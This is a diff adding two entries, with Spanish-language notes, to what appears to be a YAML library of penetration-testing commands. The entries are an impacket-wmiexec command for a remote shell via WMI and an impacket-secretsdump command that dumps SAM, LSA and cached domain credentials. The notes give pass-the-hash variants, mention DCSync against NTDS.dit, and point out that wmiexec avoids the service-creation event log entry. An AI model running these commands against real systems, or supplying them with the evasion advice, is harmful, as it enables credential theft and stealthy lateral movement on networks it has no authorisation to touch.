@@ -35,3 +35,25 @@ commands:
     phase: lateral
     tags: [pass-the-hash, smb]
     notes: Crea un servicio en el objetivo, así que es ruidoso. wmiexec o smbexec dejan menos rastro.
+
+  - id: impacket-wmiexec
+    title: Shell semi-interactiva por WMI (sin servicio)
+    cmd: |
+      impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{RHOST}}
+    phase: lateral
+    tags: [lateral-movement]
+    notes: >-
+      Ejecuta por WMI en vez de instalar un servicio como psexec, así que es más sigiloso (no deja el
+      evento 7045). Para Pass-the-Hash, cambia la contraseña por -hashes :{{HASH}}. Da una shell no
+      del todo interactiva: cada comando es una conexión nueva.
+
+  - id: impacket-secretsdump-local
+    title: Volcar SAM, LSA y credenciales cacheadas de un host
+    cmd: |
+      impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{RHOST}}
+    phase: credential-access
+    tags: [credential-dumping, ntlm]
+    notes: >-
+      Con admin local saca los hashes NTLM de la SAM, los secretos LSA y las credenciales de dominio
+      cacheadas, todo en remoto. Para Pass-the-Hash, -hashes :{{HASH}}. Para volcar la base entera
+      del dominio (NTDS.dit) desde un DC, el comando de DCSync (-just-dc-ntlm).
